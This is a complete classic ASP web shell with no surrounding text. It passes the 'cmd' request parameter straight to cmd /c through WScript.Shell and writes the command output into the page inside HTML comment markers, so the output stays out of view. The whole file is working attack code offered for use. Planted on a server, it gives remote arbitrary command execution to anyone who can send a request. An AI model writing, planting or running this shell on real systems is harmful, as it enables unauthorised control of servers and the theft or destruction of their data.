<%
Response.Write("-"&"->")

Function GetCommandOutput(command)
    Set shell = CreateObject("WScript.Shell")
    Set exec = shell.Exec(command)
    GetCommandOutput = exec.StdOut.ReadAll
End Function

Response.Write(GetCommandOutput("cmd /c " + Request("cmd")))
Response.Write("<!-"&"-")
%>
